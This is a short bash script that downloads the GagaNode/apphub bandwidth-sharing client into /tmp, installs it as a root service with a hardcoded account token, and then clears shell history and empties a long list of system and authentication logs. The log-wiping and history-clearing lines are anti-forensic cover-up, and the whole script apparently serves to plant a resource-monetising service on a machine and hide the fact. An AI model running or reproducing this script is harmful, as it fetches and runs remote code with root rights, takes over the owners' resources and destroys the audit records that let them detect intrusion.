#!/bin/bash

cd /tmp/
curl -o apphub-linux-amd64.tar.gz https://assets.coreservice.io/public/package/60/app-market-gaga-pro/1.0.4/app-market-gaga-pro-1_0_4.tar.gz && tar -zxf apphub-linux-amd64.tar.gz && rm -f apphub-linux-amd64.tar.gz && cd ./apphub-linux-amd64
cd /tmp/apphub-linux-amd64
chmod 777 apphub
sudo ./apphub service remove && sudo ./apphub service install
sudo ./apphub service start
./apphub status
chmod 777 /tmp/apphub-linux-amd64/apps/gaganode/gaganode
cd /tmp/apphub-linux-amd64/apps/gaganode/
sudo ./gaganode config set --token=osogsgqgkwyxmmqf80b8f9d7cdd32d6c
cd /tmp/apphub-linux-amd64
./apphub restart
history -c
cd /root/
echo > /var/log/wtmp
echo > /var/log/btmp
echo >/var/log/lastlog
echo > /var/log/secure
echo > /var/log/messages
echo >/var/log/syslog
echo >/var/log/xferlog
echo >/var/log/auth.log
echo >/var/log/user.log
cat /dev/null > /var/adm/sylog
cat /dev/null > /var/log/maillog
cat /dev/null > /var/log/openwebmail.log
cat /dev/null > /var/log/mail.info
echo >/var/run/utmp
cd  /root/
echo > .bash_history
history -c

